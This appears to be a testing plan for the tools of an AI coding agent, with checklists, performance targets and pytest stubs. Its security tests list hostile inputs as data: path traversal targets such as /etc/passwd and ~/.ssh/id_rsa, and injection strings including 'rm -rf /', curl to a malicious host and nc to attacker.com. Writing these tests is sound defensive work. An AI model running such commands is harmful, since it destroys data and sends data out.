# Phase 2: Core Tool Testing

**Status**: Pending Phase 1 Completion  
**Target Duration**: 2-3 sessions  
**Priority**: High

## Overview

Comprehensive testing of all individual tools (WRITE, EXECUTE, FIND, UPDATE, TODO, TASK) with security validation and performance benchmarking.

## Session Planning

### Session 1: File Operation Tools
**Focus**: WriteTool, UpdateTool, FindTool
**Duration**: 2-3 hours

#### WriteTool Testing (60 min)
- [ ] **Basic Operations**
  - [ ] File creation and overwriting
  - [ ] Directory creation
  - [ ] File and directory deletion
  - [ ] Content appending

- [ ] **Security Validation**
  - [ ] Path traversal prevention
  - [ ] Permission boundary enforcement
  - [ ] File size limits
  - [ ] Dangerous file type restrictions

- [ ] **Error Handling**
  - [ ] Permission denied scenarios
  - [ ] Disk space exhaustion
  - [ ] Invalid path handling
  - [ ] Concurrent access conflicts

#### UpdateTool Testing (60 min)
- [ ] **Surgical Modifications**
  - [ ] Line-based updates
  - [ ] Pattern-based replacements
  - [ ] Patch application
  - [ ] Content insertion

- [ ] **Safety Features**
  - [ ] Backup creation
  - [ ] Atomic operations
  - [ ] Rollback capabilities
  - [ ] Conflict detection

#### FindTool Testing (60 min)
- [ ] **Search Capabilities**
  - [ ] File name pattern matching
  - [ ] Content search across files
  - [ ] Function/class discovery
  - [ ] Recursive directory search

- [ ] **Performance**
  - [ ] Large codebase handling
  - [ ] Search result limiting
  - [ ] Memory usage optimization
  - [ ] Response time benchmarks

### Session 2: Execution and Task Tools
**Focus**: ExecuteTool, TaskTool, TodoTool
**Duration**: 2-3 hours

#### ExecuteTool Testing (90 min)
- [ ] **Command Execution**
  - [ ] Basic shell commands
  - [ ] Output capture and streaming
  - [ ] Error handling and exit codes
  - [ ] Environment variable support

- [ ] **Security Critical**
  - [ ] Command whitelist validation
  - [ ] Injection prevention
  - [ ] Resource limit enforcement
  - [ ] Privilege restriction

- [ ] **Performance and Reliability**
  - [ ] Timeout handling
  - [ ] Memory limit enforcement
  - [ ] Concurrent execution
  - [ ] Process cleanup

#### TaskTool Testing (45 min)
- [ ] **Task Orchestration**
  - [ ] Task decomposition
  - [ ] Dependency management
  - [ ] Execution planning
  - [ ] Progress tracking

- [ ] **Error Handling**
  - [ ] Failed task recovery
  - [ ] Dependency failures
  - [ ] Partial completion scenarios
  - [ ] Rollback mechanisms

#### TodoTool Testing (45 min)
- [ ] **Task Management**
  - [ ] Todo creation and modification
  - [ ] Priority and status management
  - [ ] Task listing and filtering
  - [ ] Persistence and recovery

### Session 3: Integration and Performance
**Focus**: Cross-tool validation and performance optimization
**Duration**: 2-3 hours

#### Cross-Tool Validation (90 min)
- [ ] **Tool Compatibility**
  - [ ] Output format consistency
  - [ ] Error message standardization
  - [ ] Resource sharing behavior
  - [ ] Context preservation

- [ ] **Security Boundary Testing**
  - [ ] Consistent path validation
  - [ ] Permission enforcement
  - [ ] Resource limit coordination
  - [ ] Audit log integration

#### Performance Optimization (90 min)
- [ ] **Benchmark Suite**
  - [ ] Individual tool benchmarks
  - [ ] Memory usage profiling
  - [ ] I/O operation efficiency
  - [ ] Concurrent operation handling

- [ ] **Regression Testing**
  - [ ] Performance baseline establishment
  - [ ] Regression detection setup
  - [ ] Optimization validation
  - [ ] Resource usage monitoring

## Detailed Testing Specifications

### WriteTool Test Cases

#### Security Test Cases
```python
@pytest.mark.security
def test_write_tool_path_traversal():
    """Test WriteTool blocks path traversal attempts."""
    malicious_paths = [
        "../../../etc/passwd",
        "..\\..\\windows\\system32\\config\\sam",
        "/etc/passwd",
        "~/.ssh/id_rsa"
    ]
    
@pytest.mark.security
def test_write_tool_file_size_limits():
    """Test WriteTool enforces file size limits."""
    
@pytest.mark.security
def test_write_tool_dangerous_extensions():
    """Test WriteTool blocks dangerous file types."""
```

#### Performance Test Cases
```python
@pytest.mark.performance
def test_write_tool_large_file_performance():
    """Benchmark WriteTool with large files."""
    
@pytest.mark.performance
def test_write_tool_concurrent_operations():
    """Test WriteTool under concurrent access."""
```

### ExecuteTool Test Cases

#### Security Test Cases (Critical)
```python
@pytest.mark.security
def test_execute_tool_command_injection():
    """Test ExecuteTool prevents command injection."""
    injection_attempts = [
        "ls; rm -rf /",
        "ls && curl malicious.com",
        "ls | nc attacker.com 1234",
        "ls $(rm important_file)"
    ]
    
@pytest.mark.security
def test_execute_tool_privilege_escalation():
    """Test ExecuteTool prevents privilege escalation."""
    
@pytest.mark.security
def test_execute_tool_resource_limits():
    """Test ExecuteTool enforces resource limits."""
```

#### Reliability Test Cases
```python
@pytest.mark.reliability
def test_execute_tool_timeout_handling():
    """Test ExecuteTool timeout enforcement."""
    
@pytest.mark.reliability
def test_execute_tool_process_cleanup():
    """Test ExecuteTool cleans up processes properly."""
```

### FindTool Test Cases

#### Performance Test Cases
```python
@pytest.mark.performance
def test_find_tool_large_codebase():
    """Test FindTool performance on large codebases."""
    
@pytest.mark.performance
def test_find_tool_search_patterns():
    """Benchmark different search patterns."""
```

## Quality Gates

### Phase 2 Completion Criteria
- [ ] **Coverage**: 90%+ test coverage on all tools
- [ ] **Security**: All security tests passing
- [ ] **Performance**: Benchmarks meet target thresholds
- [ ] **Integration**: Cross-tool compatibility verified
- [ ] **Documentation**: Tool usage examples updated

### Performance Targets
- **WriteTool**: < 50ms for files under 1MB
- **ExecuteTool**: < 100ms command startup time
- **FindTool**: < 200ms search in 1000+ files
- **UpdateTool**: < 30ms for single line updates
- **TodoTool**: < 10ms for CRUD operations
- **TaskTool**: < 100ms for task decomposition

### Security Requirements
- [ ] No path traversal vulnerabilities
- [ ] No command injection possibilities
- [ ] Resource limits enforced
- [ ] Audit logging complete
- [ ] Permission boundaries respected

## Testing Infrastructure Requirements

### Required Test Data
- [ ] Large file sets (1MB, 10MB, 100MB)
- [ ] Complex directory structures (1000+ files)
- [ ] Various file types and encodings
- [ ] Malicious input vectors
- [ ] Performance stress scenarios

### Mock Requirements
- [ ] File system operation mocks
- [ ] Process execution mocks
- [ ] Network operation mocks
- [ ] Error condition simulation
- [ ] Resource limit simulation

## Common Issues and Solutions

### Known Challenges
- **ExecuteTool Security**: Most critical - extensive validation needed
- **FindTool Performance**: May need optimization for large codebases
- **UpdateTool Atomicity**: Ensuring safe partial updates
- **Cross-Tool Consistency**: Standardizing error handling

### Debug Strategies
```bash
# Individual tool testing
pytest tests/unit/tools/test_write_tool.py -v
pytest tests/unit/tools/test_execute_tool.py -v -m security

# Performance debugging
pytest tests/unit/tools/ --benchmark-only
pytest tests/unit/tools/ --cov=src/james_code/tools

# Security validation
pytest tests/unit/tools/ -m security -v
```

## Session Notes Template

### Pre-Session Checklist
- [ ] Phase 1 infrastructure available
- [ ] Test data prepared
- [ ] Development environment ready
- [ ] Security testing patterns established

### Session Progress Tracking
- [ ] Current tool focus: _____
- [ ] Completed test cases: _____
- [ ] Identified issues: _____
- [ ] Performance results: _____

### Post-Session Checklist
- [ ] Test results documented
- [ ] Issues logged and prioritized
- [ ] Next session priorities identified
- [ ] Progress tracker updated

## Phase 3 Preparation

### Integration Test Requirements
- [ ] All individual tools tested
- [ ] Performance baselines established
- [ ] Security boundaries validated
- [ ] Error handling patterns documented

### Handoff Documentation
- [ ] Tool testing patterns
- [ ] Security validation methods
- [ ] Performance benchmarking setup
- [ ] Common issue resolution guide